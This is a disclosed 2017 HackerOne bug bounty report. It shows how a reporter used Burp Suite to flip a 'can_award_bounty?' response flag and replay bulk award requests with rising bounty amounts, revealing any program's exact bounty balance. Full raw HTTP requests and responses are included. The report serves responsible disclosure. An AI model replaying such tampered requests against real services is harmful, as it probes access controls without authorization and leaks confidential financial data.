# Able To Check The Exact Bounty Balance of any Bug Bounty Program

## Report Details
- **Report ID**: 293593
- **URL**: https://hackerone.com/reports/293593
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-11-28T21:58:41.580Z
- **Disclosed**: 2017-12-06T18:41:46.631Z

## Reporter
- **Username**: cjlegacion
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hello HackerOne,
I found a way to check the exact bounty balance of any bug bounty program.


### Steps To Reproduce

1. Report to any program that giving a bounty
2. Go to your `Inbox`
3. Open the Burp Suite before you click the report you created for your target bug bounty program.
4. Click the `Intercept is off` to make it `on`, click the report you created and wait for the request like this.

Request:

```
GET /reports/240273.json HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://hackerone.com/bugs?█████████
X-Requested-With: XMLHttpRequest
Connection: close
```

5. Once you see the request above. Go to your Burp Suite, click "Do Intercept" > "Response to this Request" and edit the response.

Response:

```
HTTP/1.1 200 OK
Date: Tue, 28 Nov 2017 20:33:14 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Disposition: inline; filename="response.json"
Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c5019db6afc60ae-MNL
Content-Length: 9669

███
```

6. Change the value of parameter name `can_award_bounty?` from `false` to `true`
Note: I change the response of the request so i'm able to use the `Set award` for the request .
7. Use the `Set award` and intercept the request and put that request to `Repeater`.

Request:

```
POST /reports/bulk HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: █████
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 174
Connection: close

████████
```
Response:

```
HTTP/1.1 200 OK
Date: Tue, 28 Nov 2017 20:39:58 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Disposition: inline; filename="response."
Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c5023b59bf660c0-MNL
Content-Length: 64

{"flash":"You have successfully awarded a bounty.","reports":[]}
```

As you can see here it's showing that `"You have successfully awarded a bounty"` on the response but try to make value of parameter name `bounty_amount` higher that on the request above. By use of that you can actually check the exact bounty balance of the bug bounty program .

Request with the exact bounty balance of the "HackerOne Program":

```
POST /reports/bulk HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: ███
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 176
Connection: close

message=&substate=bounty-award&bounty_amount=31730&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD
```
Response with the exact bounty balance of the "HackerOne Program":

```
HTTP/1.1 200 OK
Date: Tue, 28 Nov 2017 20:43:14 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Disposition: inline; filename="response."
Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c502882d8246102-MNL
Content-Length: 64

{"flash":"You have successfully awarded a bounty.","reports":[]}
```

Try to make it higher to the exact bounty balance of the "HackerOne Program"

Request with higher than the exact bounty balance of the "HackerOne Program":

```
POST /reports/bulk HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: ██████████
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 176
Connection: close

message=&substate=bounty-award&bounty_amount=31731&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD
```

Response with higher than the exact bounty balance of the "HackerOne Program":

```
HTTP/1.1 422 Unprocessable Entity
Date: Tue, 28 Nov 2017 20:45:47 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Disposition: inline; filename="response."
Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c502c3d7bd86102-MNL
Content-Length: 101

{"flash":null,"reports":[{"errors":["Validation failed: insufficient funds to award this bounty."]}]}
```

As you can see on the response it's showing `"Validation failed: insufficient funds to award this bounty."`
So that's how i found a way to check the bounty balance of the bug bounty program.

PS. Even you saw the response `"flash":"You have successfully awarded a bounty."` . It's actually not sent to my account or recorded to my account. Also if it's worked maybe i'm gonna be `RICH` now Lol.

Thanks,
@cjlegacion

## Impact

The attacker are able to see the exact bounty balance of the bug bounty program even the attacker don't have an access on the program.

## Attachments
No attachments
